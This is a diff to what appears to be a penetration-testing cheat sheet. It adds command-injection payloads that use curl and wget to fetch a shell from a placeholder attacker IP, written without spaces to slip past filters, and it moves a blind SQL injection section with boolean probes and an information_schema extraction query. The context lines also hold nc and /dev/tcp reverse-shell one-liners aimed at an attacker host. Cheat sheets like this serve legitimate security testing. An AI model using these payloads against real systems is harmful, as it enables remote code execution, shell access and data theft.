@@ -23,8 +23,14 @@ nc -l [port]
 #Victim
 test; ping -c 4 <yourAttackerIP>; echo hello 
 test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
+
 #Alternative to NC for non-debian based distrobutions
 /bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 
+
+#Alternative without spaces
+http://victim/file?arg=$(CMD=$'curl\x20http://[AttackerIP]/shell.php\x20--output\x20/tmp/Notshell.php';$CMD)
+http://victim/file?arg=$({wget,http://[AttackerIP]:[AttackerPort]/t,-O,/tmp/t})
+http://victim/file?arg=$({chmod,+x,/tmp/t})
 {% endhighlight %}
 
 
@@ -119,6 +125,25 @@ Concatenation | <code> De''nt <br> De'||'nt </code>
 Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
 Sleep | <code> Sleeep(10) MySQL <br>  WAITFOR DELAY '0:0:10'  MSSQL
 
+> **Blind SQL Injection Data Exfiltration**
+
+Determine the level of blindness:
+{% highlight sql %}
+Dent' AND 1;#
+Dent' AND 1=1;#
+
+Dent' AND 0;#
+Dent' AND 1=0;#
+#Look for differences
+{% endhighlight %}
+
+Perform a binary search tree: 
+{% highlight sql %}
+substr((select table_name from information_schema.tables limit 1),1,1) > "m"
+…
+= "c"
+{% endhighlight %}
+
 > **SQL Injection: Database Identification**
 
 MS SQL Server | Incorrect syntax near 'something'
@@ -169,14 +194,6 @@ Allows multiple commands with a ';'  (Mostly MSSQL):
 Dent' ;  CREATE TABLE exfil(data varchar(1000));-- 
 {% endhighlight %}
 
-> **Blind SQL Injection Data Exfiltration**
-
-Perform a binary search tree: 
-{% highlight sql %}
-substr((select table_name from information_schema.tables limit 1),1,1) > "m"
-…
-= "c"
-{% endhighlight %}
 
 > **Reading and Writing Files**
 
